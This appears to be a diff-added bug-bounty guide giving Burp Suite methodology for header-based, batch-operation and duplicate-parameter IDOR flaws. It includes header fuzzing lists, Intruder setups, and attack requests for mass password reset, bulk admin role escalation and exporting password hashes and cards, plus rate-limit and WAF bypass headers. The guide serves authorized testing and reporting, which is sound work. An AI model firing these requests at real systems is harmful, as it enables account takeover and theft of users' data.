+   Target → Site map → Right-click → Spider this host
+   Check: "Spider form submissions"
+   Check: "Spider pause options"
+   ```
+
+2. Use Burp Scanner for passive crawl:
+   ```
+   Target → Site map → Right-click → Active Scan
+   Enable: "Passive crawl only"
+   ```
+
+### **Step 1.2: Parameter Discovery with Burp Extensions**
+
+**Install these extensions (Extender → BApp Store):**
+- **Param Miner** - Discovers hidden parameters
+- **Head3rs** - Tests for header-based vulnerabilities
+- **Autorize** - Tests authorization Bypass
+- **Authz** - Tests authorization checks
+- **Logger++** - Advanced logging
+
+**Configure Param Miner for headers:**
+```
+Right-click request → Extensions → Param Miner → 
+Select: "Guess headers"
+Select: "Add cache-buster"
+Select: "Add dynamic values"
+```
+
+### **Step 1.3: Analyze Traffic Patterns**
+
+**Use Burp Filter to identify header patterns:**
+```
+Filter by: "Extensions" → .js, .css (exclude)
+Filter by: "Status code" → 200, 302
+Search for: "X-" in Headers tab
+Search for: "User" in Headers tab
+Search for: "ID" in Headers tab
+```
+
+**Logger++ Configuration:**
+```
+Add columns: URL, Method, Status, Request Headers, Response Headers
+Filter: request_headers contains "X-" OR "User" OR "ID"
+Export results for analysis
+```
+
+---
+
+## 🔍 **Phase 2: Mapping the Attack Surface**
+
+### **Step 2.1: Identify User-Specific Endpoints**
+
+**Use Burp Intruder to find user-context endpoints:**
+
+1. **Create a wordlist of potential user-specific paths:**
+```
+/profile
+/account
+/dashboard
+/settings
+/preferences
+/orders
+/invoices
+/messages
+/notifications
+/documents
+/files
+/photos
+/api/user
+/api/account
+/api/profile
+/api/customer
+/api/member
+```
+
+2. **Configure Intruder attack:**
+```
+Target: https://example.com
+Position: §/profile§
+Payloads: Load path wordlist
+Options → Grep Extract: Add "user", "profile", "account", "id"
+```
+
+### **Step 2.2: Identify Header Usage**
+
+**Use Burp Repeater to test each endpoint:**
+
+1. **Capture a baseline request:**
+   - Intercept a normal request
+   - Send to Repeater (Ctrl+R)
+
+2. **Test adding headers:**
+   ```http
+   GET /api/profile HTTP/1.1
+   Host: example.com
+   X-User-ID: 100
+   Cookie: session=abc123
+   ```
+
+3. **Check for differences:**
+   - Response status changes
+   - Response body changes
+   - Response time changes
+   - Error messages
+
+### **Step 2.3: Use Autorize Extension**
+
+1. **Configure Autorize:**
+   ```
+   Right-click → Extensions → Autorize → Send to Autorize
+   Set low privilege user cookies
+   Set high privilege user cookies
+   Enable: "Auto scan"
+   ```
+
+2. **Interpret results:**
+   - **Red** = Definitely vulnerable
+   - **Yellow** = Potentially vulnerable
+   - **Green** = Protected
+
+---
+
+## 🧪 **Phase 3: Manual Testing Methodology**
+
+### **Step 3.1: Baseline Request Capture**
+
+**Create two test accounts:**
+- **User A** (victim): ID 100, username: victim@test.com
+- **User B** (attacker): ID 101, username: attacker@test.com
+
+**Capture requests for each:**
+```
+1. Login as User A
+2. Perform actions (view profile, load dashboard)
+3. Copy all requests to Burp
+
+4. Login as User B
+5. Perform same actions
+6. Copy all requests
+```
+
+### **Step 3.2: Header Fuzzing Strategy**
+
+**Create a comprehensive header wordlist:**
+
+```python
+# generate_headers.py
+headers = [
+    # User identification
+    "X-User-ID", "X-User-Id", "X-UserId", "X-UID", "X-Uid",
+    "X-Customer-ID", "X-Customer-Id", "X-CustomerID",
+    "X-Account-ID", "X-Account-Id", "X-AccountID",
+    "X-Profile-ID", "X-Profile-Id", "X-ProfileID",
+    "X-Member-ID", "X-Member-Id", "X-MemberID",
+    
+    # Impersonation
+    "X-Impersonate", "X-Impersonating", "X-Impersonation",
+    "X-Act-As", "X-On-Behalf-Of", "X-Behalf",
+    "X-Run-As", "X-Sudo", "X-Sudo-As",
+    "X-Switch-User", "X-Switch-To", "X-Original-User",
+    
+    # Debug/Dev
+    "X-Debug-User", "X-Test-User", "X-Dev-User",
+    "X-Bypass-User", "X-Bypass-Auth", "X-Override-User",
+    "X-Admin-User", "X-Admin-Mode", "X-Dev-Mode",
+    
+    # Proxy/Forward
+    "X-Forwarded-User", "X-Forwarded-For", "X-Real-IP",
+    "X-Original-For", "X-Original-User", "Forwarded",
+    
+    # Application specific
+    "X-App-User", "X-App-UID", "X-Application-User",
+    "X-Org-ID", "X-Organization-ID", "X-Company-ID",
+    "X-Team-ID", "X-Group-ID", "X-Department-ID",
+    "X-Role-ID", "X-Workspace-ID", "X-Project-ID",
+    "X-Tenant-ID", "X-Client-ID", "X-Instance-ID",
+    
+    # Authentication
+    "X-Auth-User", "X-Auth-UID", "X-Authenticated-User",
+    "X-Authorization-User", "X-Auth-ID",
+    
+    # Session
+    "X-Session-User", "X-Session-ID-User",
+    
+    # Variations
+    "User-ID", "UserId", "UID", "CustomerID",
+    "AccountID", "ProfileID", "MemberID",
+    "Impersonate", "Acting-As", "Run-As",
+    
+    # With underscores
+    "X_USER_ID", "X_USERID", "X_UID",
+    "X_CUSTOMER_ID", "X_ACCOUNT_ID",
+    
+    # Colon variations
+    "X-User-ID:", "X-User-ID :",
+    
+    # Case variations
+    "x-user-id", "X-User-Id", "X-USER-ID",
+    "X-User-Id", "x-USER-ID",
+    
+    # Number variations
+    "X-User-ID-1", "X-User-ID-2", "X-User-ID-3",
+    "X-User-ID-Header", "X-User-ID-Value",
+    
+    # Combined with numbers
+    "X-User-100", "X-UserId-100", "X-UID-100",
+    
+    # Common patterns from other apps
+    "X-Moodle-User", "X-WordPress-User", "X-Drupal-User",
+    "X-Joomla-User", "X-Shopify-User", "X-Salesforce-User",
+    "X-SAP-User", "X-Oracle-User", "X-Microsoft-User",
+]
+
+with open('headers.txt', 'w') as f:
+    for header in headers:
+        f.write(f"{header}\n")
+```
+
+### **Step 3.3: Burp Intruder Configuration**
+
+**Setup Intruder for header fuzzing:**
+
+1. **Prepare the request:**
+   ```http
+   GET /api/profile HTTP/1.1
+   Host: example.com
+   §X-User-ID§: §100§
+   Cookie: [attacker_session]
+   ```
+
+2. **Payload Positions:**
+   - Position 1: Header name (from wordlist)
+   - Position 2: Header value (incrementing IDs)
+
+3. **Payload Sets:**
+   ```
+   Payload set 1: Simple list → headers.txt
+   Payload set 2: Numbers → 1-1000 (step 1)
+   ```
+
+4. **Attack Types:**
+   - **Cluster bomb** (for name+value combinations)
+   - **Sniper** (for testing single header variations)
+
+5. **Resource Pool:**
+   - Set to 5-10 threads (avoid rate limiting)
+   - Add delays between requests
+
+### **Step 3.4: Advanced Intruder Setup**
+
+**Use Grep Extract to detect successful IDOR:**
+
+1. **Configure Grep Extract:**
+   ```
+   Intruder → Options → Grep Extract
+   Add: Extract user-specific data
+   Regex: "user_id":\s*"(\d+)"
+   Regex: "email":\s*"([^"]+)"
+   Regex: "username":\s*"([^"]+)"
+   ```
+
+2. **Configure Grep Match:**
+   ```
+   Add matches for:
+   - "unauthorized"
+   - "forbidden"
+   - "permission denied"
+   - "access denied"
+   - "not allowed"
+   ```
+
+3. **Add response length analysis:**
+   ```
+   Options → Response Length
+   Check: "Compare with baseline"
+   ```
+
+### **Step 3.5: Manual Testing Checklist**
+
+**Test each endpoint systematically:**
+
+```markdown
+## Endpoint: /api/user/profile
+
+### Test 1: Direct header addition
+- [ ] Add X-User-ID: 100 (victim ID)
+- [ ] Compare with own profile (ID 101)
+- [ ] Check for data exposure
+
+### Test 2: Header replacement
+- [ ] Remove all auth headers
+- [ ] Add only X-User-ID: 100
+- [ ] Check if authentication is bypassed
+
+### Test 3: Header combinations
+- [ ] X-User-ID: 100 + Cookie: [attacker]
+- [ ] X-Original-User: 100 + Cookie: [attacker]
+- [ ] X-Impersonate: 100 + Cookie: [attacker]
+
+### Test 4: Invalid values
+- [ ] X-User-ID: 999999 (non-existent)
+- [ ] X-User-ID: 0
+- [ ] X-User-ID: -1
+- [ ] X-User-ID: "admin"
+- [ ] X-User-ID: null
+- [ ] X-User-ID: true
+
+### Test 5: Format variations
+- [ ] X-User-ID: 100.0 (float)
+- [ ] X-User-ID: 0x64 (hex)
+- [ ] X-User-ID: 0144 (octal)
+- [ ] X-User-ID: 100%00 (null byte)
+```
+
+---
+
+## 📊 **Phase 4: Advanced Testing Techniques**
+
+### **Step 4.1: Parameter Pollution in Headers**
+
+**Test multiple headers:**
+```http
+GET /api/profile HTTP/1.1
+Host: example.com
+X-User-ID: 101
+X-User-ID: 100
+X-Original-User: 100
+X-Impersonate: 100
+Cookie: [attacker_session]
+```
+
+**Test with duplicates:**
+```http
+X-User-ID: 101
+X-User-ID: 100
+```
+*Which one does the server use?*
+
+### **Step 4.2: Header Chaining**
+
+**Test header combinations that might override:**
+```http
+# Chain 1: Override via debug header
+X-User-ID: 101
+X-Debug-User: 100
+
+# Chain 2: Override via proxy header
+X-User-ID: 101
+X-Forwarded-User: 100
+
+# Chain 3: Multiple overrides
+X-User-ID: 101
+X-Original-User: 100
+X-On-Behalf-Of: 100
+```
+
+### **Step 4.3: Case Sensitivity Testing**
+
+```http
+# Test all case variations
+x-user-id: 100
+X-USER-ID: 100
+X-User-Id: 100
+X-USER-Id: 100
+x-USER-id: 100
+```
+
+### **Step 4.4: Encoding Variations**
+
+```http
+# URL encoded header names
+X-User%2DID: 100
+X%2DUser%2DID: 100
+
+# Double encoded
+X%253AUser%253AID: 100
+
+# Unicode encoded
+X\u002DUser\u002DID: 100
+```
+
+---
+
+## 🔬 **Phase 5: Validation & Exploitation**
+
+### **Step 5.1: Positive Identification**
+
+**Indicators of successful IDOR:**
+- [ ] Can view another user's private data
+- [ ] Can modify another user's data
+- [ ] Can delete another user's data
+- [ ] Can perform actions as another user
+- [ ] Access to admin functions
+- [ ] Data from different account displayed
+- [ ] Status code 200 instead of 403
+- [ ] Response time different from invalid ID
+
+### **Step 5.2: Confirmation Tests**
+
+**Test 1: Cross-user data access**
+```http
+1. Login as User B → capture valid session
+2. Modify header: X-User-ID: 100 (User A)
+3. Check if User A's data is displayed
+4. Verify with actual User A data
+```
+
+**Test 2: Data modification**
+```http
+1. Login as User B
+2. POST /api/user/profile/update
+3. Add X-User-ID: 100
+4. Try updating User A's profile
+5. Check if changes reflect for User A
+```
+
+**Test 3: IDOR Chaining**
+```http
+1. Use IDOR to get User A's internal ID
+2. Use that ID in another endpoint
+3. Check for privilege escalation
+```
+
+### **Step 5.3: Impact Assessment**
+
+```markdown
+## Impact Analysis Checklist
+
+### Data Exposure
+- [ ] PII (names, emails, addresses)
+- [ ] Financial data (credit cards, transactions)
+- [ ] Medical records
+- [ ] Private messages
+- [ ] Documents/files
+- [ ] Authentication tokens
+
+### Business Impact
+- [ ] Account takeover possible
+- [ ] Data breach severity
+- [ ] Compliance violations (GDPR, HIPAA)
+- [ ] Financial fraud potential
+- [ ] Reputation damage
+
+### Exploitability
+- [ ] Requires user interaction
+- [ ] Can be automated
+- [ ] Scalable enumeration
+- [ ] Stealth level
+```
+
+---
+
+## 🛡️ **Phase 6: Bypassing Protections**
+
+### **Step 6.1: Rate Limiting Bypass**
+
+**Use Burp Intruder with rotation:**
+```python
+# Add headers to avoid rate limiting
+X-Forwarded-For: 192.168.1.§1-255§
+X-Real-IP: 10.0.0.§1-255§
+User-Agent: rotate between common UAs
+```
+
+### **Step 6.2: WAF Bypass**
+
+**Add noise headers:**
+```http
+X-User-ID: 100
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Real-IP: 127.0.0.1
+```
+
+### **Step 6.3: Authorization Bypass**
+
+**Test if headers override cookies:**
+```http
+# Remove cookie, add header
+GET /api/profile HTTP/1.1
+X-User-ID: 100
+# No Cookie header
+```
+
+**Test header priority:**
+```http
+# Both present - which wins?
+Cookie: session=user101
+X-User-ID: 100
+```
+
+---
+
+## 📝 **Phase 7: Automation with Burp Macros**
+
+### **Step 7.1: Create Session Handling Rules**
+
+1. **Project options → Sessions → Session handling rules → Add**
+
+2. **Rule description: "Add X-User-ID header for testing"**
+
+3. **Rule actions → Add → Run a macro**
+   - Record login for User A
+   - Record login for User B
+   - Set up token extraction
+
+4. **Scope:**
+   - Tools: Intruder, Repeater, Scanner
+   - URL: target.com
+
+### **Step 7.2: Create Custom Intruder Payloads**
+
+**Python payload generator:**
+```python
+# Payload generator for Burp Intruder
+def generate_payloads():
+    # Generate header variations
+    headers = [
+        ("X-User-ID", 100),
+        ("X-UserId", 100),
+        ("X-UID", 100),
+        ("X-Customer-ID", 100),
+    ]
+    
+    # Add encoding variations
+    for header, value in headers:
+        yield header.encode()
+        yield header.lower().encode()
+        yield header.upper().encode()
+        
+    # Add value variations
+    for i in range(1, 100):
+        yield f"X-User-ID: {i}".encode()
+```
+
+---
+
+## 📈 **Phase 8: Reporting Template**
+
+```markdown
+# IDOR Vulnerability Report: HTTP Header Manipulation
+
+## Vulnerability Details
+- **Bug Type:** Insecure Direct Object Reference (IDOR)
+- **Location:** [Endpoint URL]
+- **Header:** X-User-ID
+- **Severity:** High/Critical
+- **CVSS Score:** 8.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
+
+## Description
+The application accepts user identification through the X-User-ID header
+without proper authorization checks, allowing attackers to access other
+users' data by modifying this header value.
+
+## Steps to Reproduce
+
+### Prerequisites
+- Two test accounts: UserA (ID 100) and UserB (ID 101)
+- Burp Suite configured
+
+### Proof of Concept
+
+1. Login as UserB and capture request:
+```
+GET /api/user/profile HTTP/1.1
+Host: example.com
+Cookie: session=userB_session
+```
+
+2. Modify request to include X-User-ID header:
+```
+GET /api/user/profile HTTP/1.1
+Host: example.com
+X-User-ID: 100
+Cookie: session=userB_session
+```
+
+3. Observe response contains UserA's private data:
+```json
+{
+  "user_id": 100,
+  "email": "usera@example.com",
+  "private_data": "..."
+}
+```
+
+## Impact
+- Unauthorized access to 10,000+ user profiles
+- Exposure of PII (names, emails, addresses)
+- GDPR violation potential
+- Account takeover possible
+
+## Remediation
+1. Remove reliance on client-supplied user identifiers
+2. Implement server-side session validation
+3. Use indirect reference maps
+4. Add proper authorization checks
+5. Consider removing debug headers in production
+
+## Technical Evidence
+- Screenshot 1: Request with X-User-ID: 101 (own data)
+- Screenshot 2: Request with X-User-ID: 100 (victim data)
+- Burp session file attached
+- Python PoC script attached
+```
+
+---
+
+## 🛠️ **Useful Burp Extensions for This Bug**
+
+| Extension | Purpose | Installation |
+|-----------|---------|--------------|
+| **Param Miner** | Discover hidden headers | BApp Store |
+| **Head3rs** | Header vulnerability testing | BApp Store |
+| **Autorize** | Authorization bypass detection | BApp Store |
+| **Authz** | Permission testing | BApp Store |
+| **Logger++** | Advanced request logging | BApp Store |
+| **Turbo Intruder** | High-speed fuzzing | BApp Store |
+| **HTTP Request Smuggler** | Header injection | BApp Store |
+| **Backslash Powered Scanner** | Advanced scanning | BApp Store |
+
+---
+
+## 📚 **Additional Resources**
+
+### Burp Suite Pro Tips
+- Use **Session Handling Rules** for automatic header injection
+- Create **Custom Scan Checks** for IDOR detection
+- Use **Extensions API** for custom payloads
+- Master **Intruder Attack Types** (Sniper, Battering ram, Pitchfork, Cluster bomb)
+
+### Practice Labs
+- PortSwigger: IDOR labs (specifically header-based)
+- PentesterLab: "HTTP Header Injection" exercises
+- HackTheBox: Machines with header-based IDOR
+
+### Wordlists to Use
+- SecLists: `/Discovery/Web-Content/burp-parameter-names.txt`
+- SecLists: `/Discovery/Web-Content/headers.txt`
+- Custom generated from JavaScript files
+
+---
+
+## ✅ **Success Checklist**
+
+- [ ] Identified at least 3 endpoints accepting user IDs
+- [ ] Tested 50+ header variations
+- [ ] Confirmed IDOR with two different user accounts
+- [ ] Documented exact request/response
+- [ ] Assessed business impact
+- [ ] Created proof of concept
+- [ ] Reported with clear remediation steps
+
+---
+
+# 🔍 **Bug #25: IDOR in Batch Operations - Complete Burp Suite Methodology**
+
+## 📋 **Bug Description**
+**Bug #25** refers to **IDOR vulnerabilities in batch operations** where applications allow processing multiple records simultaneously. These endpoints are particularly dangerous because a single request can access/modify hundreds of records.
+
+---
+
+## 🎯 **Target Characteristics**
+Look for endpoints with:
+- `/batch`, `/bulk`, `/mass-` in URL
+- Array parameters (`users[]`, `ids[]`)
+- CSV/JSON lists of IDs
+- Import/Export functionality
+- Multi-select operations
+- Admin panel bulk actions
+
+---
+
+## 🛠️ **Complete Burp Suite Methodology**
+
+### **PHASE 1: Reconnaissance & Mapping**
+
+#### **Step 1.1: Spider the Target**
+```
+1. Configure Burp:
+   - Proxy → Options → Spider → Check "Spider form inputs"
+   - Scope → Add target domain
+
+2. Manual browsing:
+   - Click every bulk operation button
+   - Test all multi-select features
+   - Use "Import", "Export", "Mass Update" features
+   - Check admin panels thoroughly
+```
+
+#### **Step 1.2: Parameter Discovery**
+```bash
+# Use Burp Intruder for parameter fuzzing
+1. Send request to Intruder
+2. Add positions at:
+   - URL path: /api/v1/§batch§
+   - Query params: ?§action§=bulk
+   - JSON keys: {"§ids§":[1,2,3]}
+   
+3. Payloads (common batch parameter names):
+   ids, batch_ids, user_ids, record_ids, items, 
+   selected, list, array, bulk, mass, multiple,
+   collection, data_set, records, entries
+```
+
+### **PHASE 2: Request Analysis**
+
+#### **Step 2.1: Identify Batch Request Formats**
+
+**JSON Array Format:**
+```json
+POST /api/users/batch HTTP/1.1
+Content-Type: application/json
+
+{
+    "ids": [100, 101, 102],
+    "operation": "delete"
+}
+```
+
+**CSV/Comma Format:**
+```
+POST /api/bulk-delete HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+ids=100,101,102&action=delete
+```
+
+**Range Format:**
+```
+GET /api/export?user_range=100-200
+```
+
+**Multi-Parameter Format:**
+```
+POST /api/update-multiple
+id[]=100&id[]=101&id[]=102
+```
+
+### **PHASE 3: IDOR Testing Methodology**
+
+#### **Step 3.1: Setup Burp Intruder for Batch Testing**
+
+**Configuration:**
+```
+Target: https://target.com/api/users/batch
+Attack Type: Sniper or Pitchfork
+
+Payload Positions:
+{"ids":[§100§,101,102]}
+```
+
+**Payload Sets:**
+```
+Set 1: Sequential IDs (100,101,102,103...)
+Set 2: Other users' IDs (gathered from recon)
+Set 3: Negative/zero IDs (0, -1, -999)
+Set 4: Large numbers (999999, 999999999)
+Set 5: Non-existent IDs
+Set 6: Admin IDs (1, 2, 500, admin, root)
+```
+
+#### **Step 3.2: Response Analysis Techniques**
+
+```python
+# Response comparison script for Burp Extender
+def analyze_response(response):
+    indicators = {
+        'success': [200, 'success', 'true', 'updated'],
+        'failure': [403, 404, 'error', 'denied', 'unauthorized'],
+        'partial_success': ['partially', 'some', 'limited']
+    }
+    
+    # Check status codes
+    if response.status_code == 200:
+        # Analyze response body for data leakage
+        if 'other_user' in response.body:
+            return "IDOR_CONFIRMED"
+```
+
+### **PHASE 4: Specific Attack Vectors**
+
+#### **Vector 4.1: Vertical IDOR (Privilege Escalation)**
+
+**Original Request (User A):**
+```json
+POST /api/bulk-delete HTTP/1.1
+Cookie: session=userA_session
+
+{
+    "documents": [1001, 1002, 1003]
+}
+```
+
+**Modified Request (Try Admin IDs):**
+```json
+{
+    "documents": [1, 2, 3, 4, 5]  // Admin document IDs
+}
+```
+
+**Burp Intruder Setup:**
+```
+1. Send to Intruder
+2. Payload positions: [§1§, §2§, §3§, §4§, §5§]
+3. Payload type: Numbers (sequential 1-100)
+4. Resource pool: 1 thread (avoid rate limiting)
+```
+
+#### **Vector 4.2: Horizontal IDOR (Access Other Users)**
+
+**Original Request:**
+```json
+POST /api/export HTTP/1.1
+
+{
+    "user_ids": [501, 502]  // User A's friends
+}
+```
+
+**Modified Request:**
+```json
+{
+    "user_ids": [101, 102, 103, 104]  // Random users
+}
+```
+
+**Enumeration Strategy:**
+```
+1. Gather valid user IDs from:
+   - Public profiles
+   - API responses
+   - Comments/posts
+   - Error messages
+
+2. Test in batches of 10-20 IDs
+3. Monitor response times (longer = more data)
+```
+
+#### **Vector 4.3: Mass Assignment IDOR**
+
+**Original:**
+```json
+POST /api/users/update-batch HTTP/1.1
+
+{
+    "updates": [
+        {"id": 100, "email": "user@test.com"},
+        {"id": 101, "email": "friend@test.com"}
+    ]
+}
+```
+
+**Modified:**
+```json
+{
+    "updates": [
+        {"id": 1, "email": "hacker@evil.com"},   // Admin
+        {"id": 2, "email": "hacker@evil.com"},   // Another admin
+        {"id": 3, "email": "hacker@evil.com"}    // System account
+    ]
+}
+```
+
+### **PHASE 5: Advanced Burp Techniques**
+
+#### **5.1: Using Burp Comparer**
+```
+1. Send original response (valid user)
+2. Send modified response (other user)
+3. Comparer → Word/Byte comparison
+4. Look for:
+   - Different data lengths
+   - New fields appearing
+   - Missing authorization headers
+   - Different status codes
+```
+
+#### **5.2: Burp Intruder - Grep Extract**
+```
+Intruder → Options → Grep - Extract:
+1. Add item: "total_count": "(\d+)"
+2. Add item: "users": \[(.*?)\]
+3. Add item: "error": "([^"]*)"
+
+This automatically highlights:
+- Number of records accessed
+- Data being leaked
+- Error patterns
+```
+
+#### **5.3: Burp Sequencer for Predictable IDs**
+```
+1. Capture 100+ batch requests
+2. Send to Sequencer
+3. Analyze token/ID randomness
+4. If predictable → Generate valid IDs for attack
+```
+
+### **PHASE 6: Exploitation Scenarios**
+
+#### **Scenario 6.1: Data Exfiltration via Export**
+```http
+POST /api/export/batch HTTP/1.1
+Host: target.com
+Cookie: session=valid_user
+
+{
+    "export_type": "user_data",
+    "user_ids": [1,2,3,4,5,6,7,8,9,10],
+    "fields": ["email", "password_hash", "credit_card"]
+}
+```
+
+#### **Scenario 6.2: Mass Account Takeover**
+```http
+POST /api/admin/password-reset/batch HTTP/1.1
+Cookie: session=admin_session  # Check if admin check missing
+
+{
+    "user_ids": [101,102,103,104],
+    "new_password": "hacked123",
+    "notify_user": false
+}
+```
+
+#### **Scenario 6.3: Bulk Privilege Escalation**
+```http
+POST /api/admin/role-update/batch HTTP/1.1
+
+{
+    "user_ids": [101,102,103,104],
+    "new_role": "administrator"
+}
+```
+
+### **PHASE 7: Detection & Validation**
+
+#### **Success Indicators:**
+```yaml
+Positive signs:
+  - HTTP 200 on batch with mixed ownership
+  - Response contains other users' data
+  - Different response lengths
+  - "success": true for all IDs
+  - No ownership validation errors
+  
+Critical signs:
+  - Access to admin IDs
+  - Password hash exposure
+  - PII leakage
+  - Payment information
+```
+
+#### **Negative Indicators:**
+```yaml
+Properly secured:
+  - 403 Forbidden for unauthorized IDs
+  - 400 Bad Request with mixed ownership
+  - "unauthorized" in response
+  - Only returns owned records
+  - Proper filtering applied
+```
+
+### **PHASE 8: Automation with Burp Extensions**
+
+#### **8.1: Autorize Extension Setup**
+```
+1. Install Autorize from BApp Store
+2. Configuration:
+   - Check "Detect IDOR"
+   - Enable "Batch operation mode"
+   - Set "Authorization header" if needed
+3. Run requests through Autorize
+4. Look for "Potential IDOR" alerts
+```
+
+#### **8.2: AuthMatrix Configuration**
+```
+1. Install AuthMatrix
+2. Create roles: UserA, UserB, Admin
+3. Add batch endpoints
+4. Generate matrix
+5. Identify privilege gaps
+```
+
+#### **8.3: Custom Python Extender Script**
+```python
+from burp import IBurpExtender, IIntruderPayloadGenerator
+import random
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGenerator):
+    
+    def generatePayload(self, baseValue):
+        # Generate batch ID combinations
+        batch_sizes = [5, 10, 20, 50, 100]
+        for size in batch_sizes:
+            ids = [str(random.randint(1, 1000)) for _ in range(size)]
+            yield ','.join(ids)
+```
+
+### **PHASE 9: Reporting Template**
+
+```markdown
+# IDOR in Batch Operation - Critical Finding
+
+## Vulnerability Type
+Insecure Direct Object Reference (IDOR) in batch user update endpoint
+
+## Endpoint
+POST /api/users/batch-update
+
+## Description
+The application fails to validate ownership when processing batch operations, allowing authenticated users to modify arbitrary user accounts.
+
+## Steps to Reproduce
+1. Login as user A (ID: 100)
+2. Capture batch update request:
+   POST /api/users/batch-update
+   {"user_ids":[100,101,102],"email":"hacker@test.com"}
+3. Modify to include victim IDs:
+   {"user_ids":[1,2,3,4,5,100],"email":"hacker@test.com"}
+4. Observe 200 OK response
+5. Verify victim accounts updated
+
+## Impact
+- Mass account takeover possible
+- Data breach of 1000+ users
+- Privilege escalation to admin
+
+## Proof of Concept
+[Include Burp screenshots]
+[Request/Response pairs]
+[Extracted sensitive data]
+
+## Remediation
+- Implement ownership checks per record
+- Use database-level filtering
+- Limit batch sizes
+- Log all batch operations
+```
+
+### **PHASE 10: Advanced Tips & Tricks**
+
+#### **10.1: Bypass Rate Limiting**
+```python
+# Use Burp Intruder with delays
+1. Intruder → Resource Pool
+2. Set "Maximum concurrent requests": 1
+3. Set "Delay between requests": 1000ms
+4. Add random jitter
+```
+
+#### **10.2: Handle CSRF Tokens**
+```python
+1. Use Burp Macros
+2. Project Options → Sessions
+3. Create macro to extract fresh token
+4. Apply to batch requests
+```
+
+#### **10.3: Test Blind IDOR**
+```http
+POST /api/analytics/batch HTTP/1.1
+
+{
+    "events": [
+        {"user_id": 100, "action": "view"},
+        {"user_id": 1, "action": "view"}  # Check if logged
+    ]
+}
+
+# Check:
+1. Analytics dashboard
+2. Log files
+3. Admin notifications
+4. Response timing differences
+```
+
+#### **10.4: GraphQL Batch Queries**
+```graphql
+POST /graphql HTTP/1.1
+
+{
+  "query": "query batch($ids: [ID!]!) {
+    users(ids: $ids) {
+      id
+      email
+      password
+      creditCard
+    }
+  }",
+  "variables": {
+    "ids": [1, 2, 3, 4, 5, 100, 101]
+  }
+}
+```
+
+### **🚨 Critical Checkpoints**
+
+```javascript
+// When testing batch operations, ALWAYS check:
+const criticalPoints = [
+  "Does response contain other users' data?",
+  "Can I mix my IDs with admin IDs?",
+  "Does batch size affect authorization?",
+  "Are there different error messages?",
+  "Can I import malicious payloads?",
+  "Is there an audit log bypass?",
+  "Can I chain with other vulnerabilities?"
+];
+```
+
+### **📊 Success Metrics**
+
+| Test Type | Success Indicator | Severity |
+|-----------|-------------------|----------|
+| Mix IDs | Access to 1+ foreign records | Medium |
+| All Foreign | Complete data access | High |
+| Admin IDs | Privilege escalation | Critical |
+| Mass Update | Account takeover | Critical |
+| Data Export | PII exposure | High |
+| File Operations | System files access | Critical |
+
+---
+
+## 🎯 **Quick Checklist for Bug #25**
+
+- [ ] Identify all batch endpoints
+- [ ] Map request formats (JSON, CSV, array)
+- [ ] Test mixing owned/unowned IDs
+- [ ] Test all-foreign IDs
+- [ ] Test admin/system IDs
+- [ ] Check response for data leakage
+- [ ] Verify with multiple user accounts
+- [ ] Document authorization gaps
+- [ ] Create proof of concept
+- [ ] Write detailed report
+
+---
+
+# 🎯 **Bug #26: Duplicate Parameters IDOR - Complete Burp Suite Methodology**
+
+## **What is Bug #26?**
+**HTTP Parameter Pollution (HPP) via Duplicate Parameters** - When the server receives multiple parameters with the same name (`?id=100&id=101`), different technologies handle this differently. This can lead to IDOR if the server uses the "wrong" parameter value for authorization vs. data retrieval.
+
+---
+
+## 📚 **Understanding the Vulnerability**
+
+### **How Different Technologies Handle Duplicate Parameters:**
+
+| Technology | Behavior |
+|------------|----------|
+| **PHP/Apache** | Last parameter wins (`id=101`) |
+| **ASP.NET/IIS** | Concatenates with comma (`100,101`) |
+| **Node.js/Express** | Usually first parameter wins or creates array |
+| **Python/Flask** | Typically last parameter wins |
+| **Java/Spring** | Usually first parameter wins |
+| **Ruby on Rails** | Creates array, needs specific handling |
+| **Nginx/Apache** | Passes all parameters to backend |
+
+### **The IDOR Scenario:**
+- **Authorization Check** uses first parameter (`id=100` - YOUR resource)
+- **Data Retrieval** uses second parameter (`id=101` - VICTIM's resource)
+- Result: You access `id=101` while authorized for `id=100`
+
+---
+
+## 🔍 **FULL BURP SUITE METHODOLOGY**
+
+### **PHASE 1: Reconnaissance & Discovery**
+
+#### **Step 1.1: Map the Application**
+1. **Spider the target**:
+   - Right-click target → **Spider** → **Spider this host**
+   - Use **Engagement tools** → **Discover content**
+
+2. **Identify all parameters**:
+   - Use **Burp Scanner** passive crawl
+   - Check **Target** → **Site map** for all endpoints
+   - Look for patterns like: `id`, `user_id`, `file`, `doc`, `order`, `account`
+
+3. **Create parameter wordlist**:
+```
+id
+user_id
+userId
+account_id
+file_id
+document_id
+order_id
+profile_id
+customer_id
+pid
+uid
+ref
+reference
+```
+
+#### **Step 1.2: Identify Potential Targets**
+Look for endpoints that:
+- Display user-specific data
+- Perform actions on resources
+- Have sequential/numeric IDs
+- Don't have obvious access controls
+
+**Common vulnerable endpoints:**
+```
+/api/user/profile?id=100
+/download.php?file=100
+/view_order.php?order=100
+/account/settings?user_id=100
+/documents/view?doc=100
+/messages/read?message_id=100
+```
+
+---
+
+### **PHASE 2: Baseline Testing**
+
+#### **Step 2.1: Capture Normal Request**
+1. Intercept a request with an ID parameter:
+   - Turn on **Intercept** (Proxy → Intercept)
+   - Perform action in browser
+   - Send to **Repeater** (Right-click → Send to Repeater)
+
+2. **Document baseline response**:
+   - Status code
+   - Response length
+   - Unique identifiers in response
+   - User-specific data
+
+#### **Step 2.2: Test Basic IDOR First**
+Before trying duplicate params, confirm basic IDOR exists:
+```
+Normal: id=100 → Your data
+Test:   id=101 → If accessible, you have IDOR
+Test:   id=99  → If accessible, you have IDOR
+```
+
+**In Burp Repeater:**
+1. Change parameter value
+2. Send request
+3. Compare responses
+
+---
+
+### **PHASE 3: Duplicate Parameters Testing**
+
+#### **Step 3.1: Manual Testing in Repeater**
+
+**Test Cases to Try:**
+
+```
+# Test 1: Same value, duplicate
+?id=100&id=100
+
+# Test 2: Different values (your ID + victim ID)
+?id=100&id=101
+
+# Test 3: Different values (victim ID + your ID)
+?id=101&id=100
+
+# Test 4: Multiple duplicates
+?id=100&id=101&id=102&id=103
+
+# Test 5: With other parameters
+?user_id=100&id=101&user_id=102
+```
+
+**Step-by-Step in Repeater:**
+
+1. **Send request with normal params** → Record response
